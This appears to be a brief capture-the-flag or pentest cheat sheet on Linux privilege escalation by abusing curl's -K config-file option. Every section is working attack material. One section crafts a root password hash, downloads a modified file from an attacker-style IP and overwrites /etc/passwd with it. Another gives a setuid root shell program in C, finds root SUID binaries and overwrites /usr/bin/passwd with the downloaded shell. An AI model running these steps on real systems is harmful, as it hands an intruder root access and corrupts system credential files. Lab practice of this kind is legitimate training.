___
# Config files

-K curl option

## modify passwd

```bash
openssl passwd
dani

$1$6b08xeNA$XuKBrTbrmzbS4tG1R0YBX/
```

Copy /etc/passwd and add the password to root, 

```bash
root:$1$6b08xeNA$XuKBrTbrmzbS4tG1R0YBX/:0:0:root:/root:/bin/bash
```

modify the curl config file

```bash
url = "http://10.10.14.21/passwd"
output = "/etc/passwd"
```

```bash
curl -K configFile
```


## suid binary

```c
void main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh","sh",0);
}
```

```bash
gcc -o setuid setuid.c 
```

look for a setuid root binary to overwrite:

```bash
find / -type f -user root -perm -4000 -ls 2>/dev/null
```

```
url = "http://10.10.14.5/setuid"
output = /usr/bin/passwd
```

```bash
/usr/bin/passwd
```
